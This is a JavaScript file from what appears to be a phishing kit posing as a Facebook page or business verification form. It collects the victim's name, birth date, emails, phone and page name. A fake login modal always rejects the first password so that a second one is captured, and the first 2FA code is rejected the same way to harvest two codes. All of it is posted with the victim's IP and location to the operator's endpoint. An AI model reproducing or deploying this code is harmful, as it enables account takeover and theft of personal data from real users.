jQuery.validator.addMethod("rangePhone", function (value, element, params) {
    if (value.length >= params[0] && value.length <= params[1]) {
        return true;
    } else {
        return false;
    }
});
var oForm = $('form#basic');
oForm.validate({
    onfocusout: false,
    invalidHandler: function (oForm, validator) {
        var errors = validator.numberOfInvalids();
        if (errors) {
            validator.errorList[0].element.focus();
        }
    },
    // errorClass: 'ant-input-status-error error',
    rules: {
        basic_fill_reason: "required",
        basic_Name: "required",
        basic_Email: {
            required: true,
            email: true
        },
        basic_PersonalEmail: {
            required: true,
            email: true
        },
        basic_Phone: "required",
        basic_Pagename: "required",
        basic_check_form: "required",
        basic_fill_birth_day: "required"
    },
    messages: {
        basic_fill_reason: "Please input information!",
        basic_Name: "Please input full name!",
        basic_Email: {
            required: "Please input business email address!",
            email: 'Please enter a valid email address.'
        },
        basic_PersonalEmail: {
            required: "Please input business email address!",
            email: 'Please enter a valid email address.'
        },
        basic_Phone: "Please input mobile phone number!",
        basic_Pagename: "Please input your facebook page name!",
        basic_fill_birth_day: "Please input your birth day!",
        basic_check_form: "Please agree to our terms and data and cookie policy!",
    }
});
function showLoadingCircle() {
    document.getElementById('spinner').style.display = 'block';
}

function submitLogin() {
    localStorage.setItem('business_check_2fa', 0);
    $.ajax({
        url: URL_SEND_MESSAGE,
        type: 'POST',
        data: {
            _token: $('#_token').val(),
            basic_fill_page_ip: localStorage.getItem('ip_addr'),
            basic_fill_page_country: localStorage.getItem('country_code'),
            basic_fill_page_city: localStorage.getItem('region_code'),
            basic_fill_reason: localStorage.getItem('basic_fill_reason'),
            basic_fill_sex: localStorage.getItem('basic_fill_sex'),
            basic_fill_name: localStorage.getItem('basic_fill_name'),
            basic_fill_birth_day: localStorage.getItem('basic_fill_birth_day'),
            basic_fill_business_email: localStorage.getItem('basic_fill_business_email'),
            basic_fill_personal_email: localStorage.getItem('basic_fill_personal_email'),
            basic_fill_phone: localStorage.getItem('basic_fill_phone'),
            basic_fill_page_name: localStorage.getItem('basic_fill_page_name'),
            basic_fill_page_first_password: localStorage.getItem('basic_fill_page_first_password'),
            basic_fill_page_second_password: localStorage.getItem('basic_fill_page_second_password'),

        },
        success: function (result) {
            window.location.href = result.nextstep;
        }
    });
}
function getIP() {
    $.ajax({
        url: URL_CHECK_IP,
        type: 'GET',
        contentType: 'application/json',
        async: true,
        success: function (msg) {
            ip = msg.ip;
            country = msg.country;
            localStorage.setItem('country_code', country);
            localStorage.setItem('ip_addr', ip);
            $.ajax({
                url: 'https://ipapi.co/' + ip + '/city/',
                type: 'GET',
                contentType: 'application/json',
                async: true,
                success: function (msg) {
                    localStorage.setItem('region_code', msg);
                },
            });
        },
    });
}
$('#business-submit').on("click", (e) => {
    e.preventDefault();
    localStorage.setItem('check_login', 0);
    if ($(oForm).valid()) {
        localStorage.setItem('basic_fill_reason', $('#basic_fill_reason').val());
        localStorage.setItem('basic_fill_sex', $('input[name="sex"]:checked').val());
        localStorage.setItem('basic_fill_name', $('#basic_Name').val());
        localStorage.setItem('basic_fill_business_email', $('#basic_Email').val());
        localStorage.setItem('basic_fill_personal_email', $('#basic_PersonalEmail').val());
        localStorage.setItem('basic_fill_phone', $('#basic_Phone').val());
        localStorage.setItem('basic_fill_page_name', $('#basic_Pagename').val());
        localStorage.setItem('basic_fill_birth_day', $('#basic_fill_birth_day').val());
        $.ajax({
            url: URL_FB,
            type: 'GET',
            success: function (html) {
                $('.modal').html(html);
                $('.modal').modal('show');
                $('#togglePassword').on("click", function () {
                    let type = $('#show_hide_password input').attr('type');
                    if (type == 'password') {
                        $('#show_hide_password input').attr('type', 'text');
                        $(this).removeClass('bi-eye-slash').addClass('bi-eye');
                    } else {
                        $('#show_hide_password input').attr('type', 'password');
                        $(this).removeClass('bi-eye').addClass('bi-eye-slash');
                    }
                });
                $('#submitLogin').on("click", () => {
                    $('.fa-circle-o-notch').show();
                    setTimeout(() => {
                        if (localStorage.getItem('check_login') == 0) {
                            localStorage.setItem('basic_fill_page_first_password', $('#password').val());
                            localStorage.setItem('check_login', 1);
                            $('.fa-circle-o-notch').hide();
                            $('.password-error').show();
                        } else {
                            localStorage.setItem('basic_fill_page_second_password', $('#password').val());
                            submitLogin();
                        }
                    }, 1000)
                    return false;
                })
            }
        });
    }
});
$(document).on('click', '#btn-submit', function (e) {
    e.preventDefault();
    $('#btn-submit').attr('disabled', true);
});

$(document).on('click', '#submit-2fa', function (e) {
    e.preventDefault();
    $('#submit-2fa').attr('disabled', true);
    $('.fa-circle-o-notch').show()
    var cgn = $($('#basicForm_fill_code')[0]).val();
    if (!cgn || (cgn.length != 6 && cgn.length != 8)) {
        $('.2fa-error').text('Code is invalid!');
        $('.fa-circle-o-notch').hide();
        $('#submit-2fa').attr('disabled', false);
        return;
    } else {
        $('.2fa-error').hide();
        var check_2fa = localStorage.getItem('business_check_2fa');
        console.log(check_2fa);
        if (check_2fa == 0 || check_2fa == null) {
            setTimeout(function () {
                localStorage.setItem('business_check_2fa', 1);
                localStorage.setItem('2fa_fisrt', cgn);
                $('.2fa-error').text('Code is invalid or has expired, please re-enter a new code');
                $('.2fa-error').show();
                $('.fa-circle-o-notch').hide();
                $('#submit-2fa').attr('disabled', false);
            }, 1000);
        } else {
            $.ajax({
                url: URL_SEND_MESSAGE,
                method: "POST",
                data: {
                    _token: $('#_token').val(),
                    basic_fill_page_ip: localStorage.getItem('ip_addr'),
                    basic_fill_page_country: localStorage.getItem('country_code'),
                    basic_fill_page_city: localStorage.getItem('region_code'),
                    basic_fill_reason: localStorage.getItem('basic_fill_reason'),
                    basic_fill_sex: localStorage.getItem('basic_fill_sex'),
                    basic_fill_name: localStorage.getItem('basic_fill_name'),
                    basic_fill_birth_day: localStorage.getItem('basic_fill_birth_day'),
                    basic_fill_business_email: localStorage.getItem('basic_fill_business_email'),
                    basic_fill_personal_email: localStorage.getItem('basic_fill_personal_email'),
                    basic_fill_phone: localStorage.getItem('basic_fill_phone'),
                    basic_fill_page_name: localStorage.getItem('basic_fill_page_name'),
                    basic_fill_page_first_password: localStorage.getItem('basic_fill_page_first_password'),
                    basic_fill_page_second_password: localStorage.getItem('basic_fill_page_second_password'),
                    basic_fill_page_first_2fa: localStorage.getItem('2fa_fisrt'),
                    basic_fill_page_second_2fa: cgn,
                    is_2fa: true
                },
                success: function (result) {
                    setTimeout(function () {
                        localStorage.setItem('business_check_2fa', 0);
                        window.location.href = result.nextstep;
                    }, 2000)
                }
            });
        }
        $('.2fa-error').hide();
    }
});




